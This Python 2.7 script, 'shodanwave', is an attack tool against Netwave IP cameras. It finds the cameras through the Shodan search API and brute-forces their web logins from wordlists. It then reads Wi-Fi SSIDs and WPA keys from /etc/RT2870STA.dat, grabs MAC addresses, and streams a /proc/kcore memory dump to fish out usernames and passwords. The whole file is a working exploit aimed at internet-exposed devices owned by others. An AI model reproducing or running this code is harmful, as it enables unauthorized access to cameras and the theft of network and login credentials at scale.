#!/usr/bin/python2.7


import argparse
import sys,os,time
import subprocess
import signal
from threading import Thread
import random

try:

 import shodan
 import requests
 from pyfiglet import Figlet
 import tailer

except ImportError as e:
    print("Error: %s" % (e))
    print("Try this ... pip install -r /path/to/requirements.txt")


class bgcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def main() :

 Graph = Figlet(font='slant')
 GraphRender = Graph.renderText('shodanwave')

 print("%s" % (bgcolors.WARNING + GraphRender + bgcolors.ENDC))
 print(bgcolors.FAIL + "\rThis tool is successfully connected to shodan service\nInformation the use of this tool is illegal, not bad.\n" + bgcolors.ENDC)
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-s','--search', dest='search', default='Netwave IP Camera', type=str, help='Default Netwave IP Camera')
 parser.add_argument('-u','--username', dest="username", default="", type=file, help='Select your usernames wordlist')
 parser.add_argument('-w','--wordlist', dest="password", default="", type=file, help='Select your passwords wordlist')
 parser.add_argument('-k','--shodan', dest="address", default='', type=str, help='Shodan API key')
 args = parser.parse_args()


 try:

  if sys.argv[2] == "-h" or sys.argv[3] == "--help":
   print "Usage: python shodanwave.py --help"
   sys.exit(0)
  else:
   pass
 except Exception as e:
   print("%s" % (bgcolors.WARNING + GraphRender + bgcolors.ENDC))
   print "Usage: python shodanwave.py --help"
   sys.exit(0)

 def signal_handler(signal, frame):
  print('\nclearing up..')
  os.system("rm -rf tmpstream.txt")
  os.system("rm -rf tmpstrings.out")
  os.system("killall -9 wget")
  os.system("killall -9 tail")
  sys.exit(0)


 signal.signal(signal.SIGINT, signal_handler)

 def NetworkSearchosts():

  exploit = True
  found = False
  macaddr = ""

  try:

   shodanapi = shodan.Shodan(args.address)
   api = shodanapi.search(args.search)
   total = api.get('total')

   usernames = args.username.readlines()
   passwords = args.password.readlines()

   print(bgcolors.OKGREEN + "[+] Shodan successfully Connected."+ bgcolors.ENDC)
   print(bgcolors.OKGREEN + "[+] Netwave Exploit Enabled."+ bgcolors.ENDC)
   print(bgcolors.OKGREEN + "[+] Netwave IP Camera Found: %d" % (total) + bgcolors.ENDC)
   print(bgcolors.OKGREEN + "[+] Passwords loaded: %d" % (len(passwords)) + bgcolors.ENDC)

   ShodanModuleExploit = raw_input(bgcolors.WARNING + "[!] Disable password discovery module? (S/n): " + bgcolors.ENDC)

   if ShodanModuleExploit.upper() == "S":
      print(bgcolors.FAIL + "[-] Netwave exploit disabled." + bgcolors.ENDC)
      exploit = False

   while True:

    for hosts in api['matches'] :

     host = hosts.get('ip_str')
     port = hosts.get('port')
     country = hosts.get('country', 'n/a')
     org = hosts.get('org', 'n/a')
     hostnames = hosts.get('hostnames', 'n/a')
     product = hosts.get('product', 'n/a')


     try:

      path = "snapshot.cgi"
      url = "http://%s:%s/%s" % (host, port, path)

      print("[+] Launching brute force on host http://%s:%s" % (host, port))
      for administrator in usernames :
       administrator = administrator.strip()
       for password in passwords:
        password = password.strip()

        agents = ["Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.1453.94 Safari/537.36"]
        payload = {"user": administrator, "pwd": password}

        

        headers = {'User-Agent': agents[0] }

        request = requests.get(url, params=payload, headers=headers)
        status = request.status_code

        if status == 200:
         print(bgcolors.FAIL + bgcolors.BOLD + "[+] Password Found %s@%s" % (administrator, password) + bgcolors.ENDC)
         exploit = False
         found = True
         break
        else:
         found = False
         if ShodanModuleExploit.upper() == "S":
           exploit = False
         else:
          exploit = True

      if not(found):
       if ShodanModuleExploit.upper() == "S":
          exploit = False
       else:
          exploit = True
       print(bgcolors.FAIL + bgcolors.BOLD + "[!] Password not found" + bgcolors.ENDC)
     except Exception as e:
      request.close()
      print("Error: %s" % (e))

     print(bgcolors.WARNING + "[!] Getting System Information" + bgcolors.ENDC)
     print(bgcolors.WARNING + "[!] Getting Wireless System Information" +bgcolors.ENDC)

     try:

      wireless = "http://%s:%s/get_status.cgi" % (host, port)
      agents = ["Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36"]
      headers = {'User-Agent': agents[0], 'Connection':'close' }

      response = requests.get(wireless, headers=headers)
      status = response.status_code
      content = response.text.split(';\n')
      


      if status == 200:
       for macaddress in content:
        if macaddress.startswith("var id="):
         macaddress = macaddress.split("'")
         macaddr = macaddress[1]

         print(bgcolors.WARNING + "[+] Mac address found %s" % (macaddr) + bgcolors.ENDC)

      else:
        print(bgcolors.FAIL + "[-] Getting mac address" + bgcolors.ENDC)
     except Exception as e:
      request.close()
      print("Error : %s" % (e))
     print("""[+] Host: http://%s:%s\n[+] Country: %s\n[+] Organization: %s\n[+] Product: %s""" % (host, port, country, org, product))
     
     try:

      url = "http://%s:%s//etc/RT2870STA.dat" % (host, port)

      agents = ["Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36"]
      headers = {'User-Agent': agents[0], 'Connection':'close'}

      response = requests.get(url, headers=headers)
      content = response.text.split("\n")

      status = response.status_code

      if status == 200:
       for crendential in content :
         if crendential.find("WPAPSK") != -1 or crendential.find("SSID") != -1  :
            crendential = crendential.replace("=", ": ")
            print(bgcolors.OKGREEN + bgcolors.BOLD + "[+] %s" % crendential + bgcolors.ENDC)  
      else:
       print(bgcolors.FAIL + bgcolors.BOLD + "[!] Wireless lan is disabled.."+ bgcolors.ENDC)
     except Exception as e:
      request.close()
      print(bgcolors.FAIL + "[!] Error: %s \nWireless lan is disabled.." % (e) + bgcolors.ENDC)

     try:

      url = "http://%s:%s//proc/kcore" % (host, port)
      done = 0
      linecount = 0

      if exploit:

       print (bgcolors.FAIL +"[+] Starting to read memory dump.. this could take a few minutes"+bgcolors.ENDC)
       proc = subprocess.Popen("wget -qO- "+ url +" >> tmpstream.txt", shell=True, preexec_fn=os.setsid)
       os.system('echo "" > tmpstrings.out')
       time.sleep(1)
       proc2 = subprocess.Popen("tail -f tmpstream.txt | strings >>tmpstrings.out", shell=True, preexec_fn=os.setsid)
       print (bgcolors.BOLD+"[+] CTRL+C to exit.."+bgcolors.ENDC)

       while 1:
          sys.stdout.flush()
          if os.stat('tmpstrings.out').st_size <= 1024:
           sys.stdout.write(bgcolors.OKGREEN + "binary data: "+str(os.stat('tmpstream.txt').st_size)+"\r" + bgcolors.ENDC)
          else:
            sys.stdout.flush()
            print "[+] Strings in binary data found.. password should be around line 10000"
            for line in tailer.follow(open('tmpstrings.out','r')):
              if done == 0:
                linecount+= 1
                if line == macaddr:
                  sys.stdout.flush()
                  done = 1
                  print (bgcolors.OKGREEN+"[+] Mac address triggered.. printing the following dumps, could leak username and passwords.."+bgcolors.ENDC)
                else:
                  sys.stdout.write(str(linecount)+"\r")
              elif done == 1:
                done = 2
                print "[+] Firstline.. "+ bgcolors.OKGREEN+line+bgcolors.ENDC
              elif done == 2:
                done = 3
                print "[+] Possible username: "+bgcolors.OKGREEN+line+bgcolors.ENDC
              elif done == 3:
                done = 4
                print "[+] Possible password: "+bgcolors.OKGREEN+line+bgcolors.ENDC
              elif done == 4:
                done = 0
                print "[+] Following line.. \n\n"+bgcolors.OKGREEN+line+bgcolors.ENDC
              else:
                pass
       signal.pause()
     except:
      print (bgcolors.FAIL+"[-] Victim isnt vulnerable for a memory leak, exiting.."+bgcolors.ENDC)
    return True
  except shodan.APIError as e:
   print(bgcolors.FAIL + "[-] Error: %s" % (e) + bgcolors.ENDC)

 NetworkSearchosts()

if __name__ == "__main__" :
 main()